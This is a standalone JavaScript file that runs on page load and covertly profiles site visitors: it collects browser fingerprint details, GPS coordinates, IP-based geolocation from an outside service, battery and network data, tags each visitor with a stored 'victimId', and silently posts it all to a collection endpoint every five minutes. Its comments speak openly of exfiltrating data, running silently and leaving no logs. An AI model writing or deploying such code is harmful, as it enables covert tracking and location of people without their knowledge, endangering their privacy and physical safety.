document.addEventListener("DOMContentLoaded", () => {
  const endpoint = "/api/collect";

  const collectData = async () => {
    // Basic Device & Browser Info
    const basic = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      screenRes: `${screen.width}x${screen.height}`,
      availRes: `${screen.availWidth}x${screen.availHeight}`,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
    };

    // Try GPS (only works over HTTPS and with user permission — but prompt is silent)
    const location = await new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ error: "Geolocation not supported" });
      } else {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            speed: pos.coords.speed
          }),
          (err) => resolve({ error: err.message }),
          { timeout: 10000, maximumAge: 300000 }
        );
      }
    });

    // Get IP-based geolocation as fallback
    const ipGeo = await fetch("https://ipapi.co/json/")
      .then(r => r.json())
      .catch(() => ({}));

    // Battery Status (if supported)
    const battery = await (navigator.getBattery?.()
      .then(bat => ({
        level: bat.level,
        charging: bat.charging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime
      }))
      .catch(() => null)) || { error: "Battery API not supported" };

    // Network Info
    const network = {
      downlink: navigator.connection?.downlink,
      effectiveType: navigator.connection?.effectiveType,
      rtt: navigator.connection?.rtt,
    };

    // Combine all
    const fullData = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer,
      pageVisibility: document.visibilityState,
      ...basic,
      gps: location,
      ipGeo: ipGeo,
      battery: battery,
      network: network,
      victimId: localStorage.getItem("vid") || (() => {
        const id = Math.random().toString(36).substr(2, 9);
        localStorage.setItem("vid", id);
        return id;
      })()
    };

    // Exfiltrate
    try {
      await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(fullData),
        keepalive: true  // Ensures send even if tab closes
      });
    } catch (e) {
      // Silent fail — no logs
    }
  };

  // Run silently
  collectData();

  // Optional: Re-exfil every 5 mins if page stays open
  setInterval(collectData, 300000);
});
